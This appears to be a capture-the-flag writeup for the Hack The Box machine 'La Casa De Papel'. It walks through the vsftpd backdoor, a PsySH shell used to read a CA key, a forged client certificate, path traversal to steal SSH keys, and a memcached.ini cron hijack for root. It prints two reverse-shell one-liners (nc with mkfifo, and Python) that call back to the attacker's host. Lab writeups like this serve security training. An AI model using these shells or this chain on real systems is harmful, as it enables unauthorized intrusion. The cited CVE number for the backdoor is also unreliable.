## La Casa De Papel


A Pretty Fun box with the La Casa De Papel (Money Heist) theme, pretty awesome show on Netflix, make sure to check it out!

So, coming back to the writeup,

As always, we start with a nmap scan of the box. I used the `-sV` to get the services running on the open ports.

```
nmap -sV -v 10.10.10.131                                                                                                                     3259ms  ...

Discovered open port 22/tcp on 10.10.10.131
Discovered open port 443/tcp on 10.10.10.131
Discovered open port 80/tcp on 10.10.10.131
Discovered open port 21/tcp on 10.10.10.131
...
Nmap scan report for lacasadepel.htb (10.10.10.131)
Host is up (0.49s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js (Express middleware)
443/tcp open  ssl/http Node.js Express framework
Service Info: OS: Unix
```

So, let's enumerate, the tcp ports on 80 and 443.

`Port 80:`

![Image](1.jpeg)

On scanning the QR Code, I thought maybe, we are supposed to break the Authentication, but that was sadly a rabbit hole. 


`Post 443:`

![Image](2.jpeg)

Interesting, so, I maybe need to generate or find a certificate to enter this. We need more information.

Let's Enumerate the FTP port.

```
ncftp 10.10.10.131                                                                                                                             2.6m  Saturday 27 July 2019 12:33:47 AM IST
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.10.10.131...                                                                                                                                                                                
(vsFTPd 2.3.4)
Login incorrect.
```

So, that didn't work. On some googl-fu, found out that `vsftpd 2.3.4` has a backdoor!. [CVE-2011-0762](https://www.cvedetails.com/cve/CVE-2011-0762/)

Tried getting a shell with metaspoilt, using the exploit-db code, but that failed. So, thought of doing it manually. Found this amazing [article](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/) which explains the procedure, pretty straight forward. 

![Image](3.png)

On connecting to the telnet backdoor service, we are greeted by a `Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman`

Basically `PsySH can be used as an interactive debugger`. 


```telnet 10.10.10.131 6200                                                                                                                                           Saturday 27 July 2019 12:48:39 AM IST
Trying 10.10.10.131...
Connected to 10.10.10.131.
Escape character is '^]'.
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
help
  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
  dump       Dump an object or primitive.                                                                                
  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
  show       Show the code for an object, class, constant, method or property.                                           
  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
  whereami   Show where you are in the code.                                                                             
  throw-up   Throw an exception or error out of the Psy Shell.                                                           
  timeit     Profiles with a timer.                                                                                      
  trace      Show the current call stack.                                                                                
  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
  clear      Clear the Psy Shell screen.                                                                                 
  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
  history    Show the Psy Shell history.                                                  Aliases: hist                  
  exit       End the current session and return to caller.                                Aliases: quit, q               
show $tokyo
  > 2| class Tokyo {
    3| 	private function sign($caCert,$userCsr) {
    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6| 		openssl_x509_export($userCert, $userCertOut);
    7| 		return $userCertOut;
    8| 	}
    9| }
```

Since the shell can execute php functions, we can try to get the CA key. 

```
file_get_contents('/home/nairobi/ca.key')
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   ....
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
```

Let's copy this to a separate file and remove the `\n` at the line ends. 


We are gonna need this to sign our certificates to get into the "restricted area" on port 443.

Using this [Medium Article](https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326), I created a new certificate for the user `Alice` and tried logging into 443.


And we're in.

![](4.jpeg)

The URL for `SEASON-1` is `https://10.10.10.131/?path=SEASON-1` which makes me think, maybe a LFI?

I try `https://10.10.10.131/?path=../../../`

![](5.jpeg)

And YES! Definitely LFI.

On further enumeration, I find

`https://10.10.10.131/?path=../../../home/berlin/.ssh`, which hosts the keys for a user. But we can only check out the directory listings and not the files. So, I go back to `SEASON-1` and download `01.avi`.

`https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp`

`U0VBU09OLTEvMDEuYXZp`, seems weird, maybe some encoding or encryption?


`https://10.10.10.131/file/U0VBU09OLTEvMDIuYXZp` for `02.avi`.


Hmm, weird? A lot of characters are common. Maybe Base64?

And yes! `U0VBU09OLTEvMDIuYXZp` decodes to `SEASON-1/02.avi`

We can now download any permitted file, just by encoding the path to Base64.

So, we download the private keys from `.ssh` folder  and `user.txt`

```
cat user.txt                                                                                                                            49.4s  Saturday 27 July 2019 12:51:36 PM IST
************REDACTED************
```

Since the user was `Berlin` I tried ssh-ing using Berlin, but it failed?!

Let's try Dali

Nopes.

The Professor?

And we are in!

```
ssh professor@10.10.10.131 -i id_rsa                                                                                                                Saturday 27 July 2019 12:51:58 PM IST

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
```

So, for initial enum, I ran `LSE.sh`, nothing very interesting. Next I always run `pspy64`, to check out any cron jobs running, or anything that can help.

So, for a couple of times, I saw the code of memcached.ini being run, in pspy. SO decided to write a version of myself and replace the code within. Now, I hit a brake when my reverse shell didn't work. I tried the usual, 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
but that didn't work. So after wasting a LOT of time on some other enumeration, I decided to change my reverse shell. I tried a Python Rev Shell, and Booyah!


```
nc -lvp 1234                       12m  Saturday 27 July 2019 05:40:21 PM IST
Listening on [0.0.0.0] (family 0, port 1234)
Connection from lacasadepel.htb 40250 received!
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # cat /root/root.txt
********REDACTED********
/ # hostname
lacasadepapel
/ # 

```


Code for `memcached.ini`

```
[program:memcached]
command = sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.166",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```


I loved this box, it's theme, and learnt a lot, especially the certificates part! Thanks for reading this writeup~!